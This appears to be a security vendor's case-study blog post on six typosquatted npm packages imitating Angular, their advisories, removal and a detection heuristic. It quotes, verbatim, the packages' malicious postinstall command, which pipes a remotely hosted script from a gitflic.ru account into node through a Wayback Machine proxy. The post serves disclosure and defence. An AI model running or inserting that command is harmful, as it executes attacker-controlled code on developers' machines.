---
title: Six Angular typosquats, one postinstall hook, published the same morning
description: On 5 October 2026, GitHub reviewed six npm packages impersonating @angular/core and @angular/cli — all claiming Angular's current version number, five of them sharing one postinstall command. All six are gone; the real @angular/core took 7.3 million downloads the same week.
date: 2026-10-05
tags: supply chain, npm, case study, malware
---

On 5 October 2026 — this morning — GitHub's Advisory Database reviewed six npm packages as
malware, all scoped names one edit away from `@angular/core` or `@angular/cli`:
[`@angupar/core`](https://github.com/advisories/GHSA-8v93-83f6-whc9),
[`@anngular/core`](https://github.com/advisories/GHSA-jxv9-3rgw-q36v),
[`@abgular/core`](https://github.com/advisories/GHSA-58jj-ccq3-fxq3),
[`@anfular/core`](https://github.com/advisories/GHSA-857q-84q8-fxgx),
[`@anguar/core`](https://github.com/advisories/GHSA-pjc3-f292-727c) and
[`@angulaar/cli`](https://github.com/advisories/GHSA-65xg-ghmw-cq2c). Every one of them declared
version `22.2.1` — which, as of today, is the real, current version of `@angular/core` on npm. That
is a change from a campaign we wrote up in September, where four PyPI typosquats claimed version
numbers a release or two behind the real packages. This batch copied the live number.

## Five names, one script

| Package | Typo technique | Advisory |
|---|---|---|
| `@angupar/core` | `l` → `p` (adjacent keys) | [GHSA-8v93-83f6-whc9](https://github.com/advisories/GHSA-8v93-83f6-whc9) |
| `@anngular/core` | extra `n` inserted | [GHSA-jxv9-3rgw-q36v](https://github.com/advisories/GHSA-jxv9-3rgw-q36v) |
| `@abgular/core` | `n` → `b` | [GHSA-58jj-ccq3-fxq3](https://github.com/advisories/GHSA-58jj-ccq3-fxq3) |
| `@anfular/core` | `g` → `f` (adjacent keys) | [GHSA-857q-84q8-fxgx](https://github.com/advisories/GHSA-857q-84q8-fxgx) |
| `@anguar/core` | `l` dropped | [GHSA-pjc3-f292-727c](https://github.com/advisories/GHSA-pjc3-f292-727c) |

All five advisories quote the identical `postinstall` entry in `package.json`:

```
curl -L https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=node.js | node
```

That pipes an unpinned, unverified script straight into Node the moment `npm install` runs — no
import required, no build step, just the act of adding the dependency. The actual payload lives at
a `gitflic.ru` project under an account named "hellscripter"; the `web.archive.org/web/` prefix in
front of it isn't an accident. Routing the request through the Wayback Machine's live-proxy path
means the request leaves the installing machine addressed to `web.archive.org`, a domain most
outbound filters wave through, while the content served is whatever "hellscripter" currently has
posted — swappable at any time, with nothing checked against a hash. Each advisory also notes the
metadata was dressed to match: the author field set to `angular`, the repository URL pointing at
`github.com/angular/angular`, the README copied from the real project.

The sixth, `@angulaar/cli`, used a different mechanism. Per its advisory
([GHSA-65xg-ghmw-cq2c](https://github.com/advisories/GHSA-65xg-ghmw-cq2c)), rather than a
postinstall hook on itself, it declared a dependency on a differently-named, swapped package that
executes during installation — a dependency-confusion step layered under the typosquat, not just a
copy-paste of the same curl command. We're flagging that it's structurally different rather than
describing its internals in detail: the registry state of the swapped dependency today doesn't
cleanly match "freshly published and malicious," and we'd rather say less than overstate what we
verified this session.

## What's left of them now

All six are gone. We checked directly:

```
$ curl -s -o /dev/null -w "%{http_code}\n" https://registry.npmjs.org/@angupar%2Fcore
404
$ curl -s -o /dev/null -w "%{http_code}\n" https://registry.npmjs.org/@anguar%2Fcore
200
```

`@anguar/core` is the interesting one — it still resolves, but with zero published versions. The
registry's own timestamps show why: created at 21:58:15 UTC on 4 October, unpublished at 03:19:09
UTC on 5 October — live for roughly five hours before npm pulled the version, leaving an empty
shell behind. npm's download-stats endpoint has no record for any of the five under this report:

```
$ curl -s https://api.npmjs.org/downloads/point/last-week/@angular/core
{"downloads":7285166,"start":"2026-09-27","end":"2026-10-03","package":"@angular/core"}
$ curl -s https://api.npmjs.org/downloads/point/last-week/@angupar/core
{"error":"package @angupar/core not found"}
```

The real `@angular/core` — first published in 2016 — took 7,285,166 downloads in the week ending 3
October. The fakes don't register at all: either genuinely zero, or too few for the endpoint to
report, in a window measured in hours rather than weeks.

## The check that catches this before install

None of this required reverse-engineering the payload. Every signal was available the moment the
package landed on npm, before GitHub reviewed it: a scoped name one substitution, insertion or
deletion from a dependency already in wide use, published for the first time that day, claiming a
version number that happens to match the real package's current release exactly. That combination —
brand-new, near-identical name, no publish history — is what MagAudit checks for on every pull
request that adds a dependency. It marks it critical on the PR, with the file and line of the
`package.json` change; whether that stops the merge depends on whether the team has made the check
required in their own branch protection settings.

## What this doesn't tell you

The advisories don't say how many times any of the six were downloaded before removal — npm's
public stats endpoint simply has no data for them, which is consistent with near-zero installs but
isn't proof of zero. They don't name who controls the `hellscripter` account on `gitflic.ru`, or
confirm whether all six names were registered by the same operator or by automated tooling trying
several typo patterns from a shared script. The four advisories where we could read an OSSF source
identifier number them `MAL-2026-17533` through `MAL-2026-17540` — close enough to suggest one
batch, not proof of it. And we did not analyse the swapped dependency behind `@angulaar/cli`
ourselves; we're repeating what its advisory states, not what we independently confirmed.
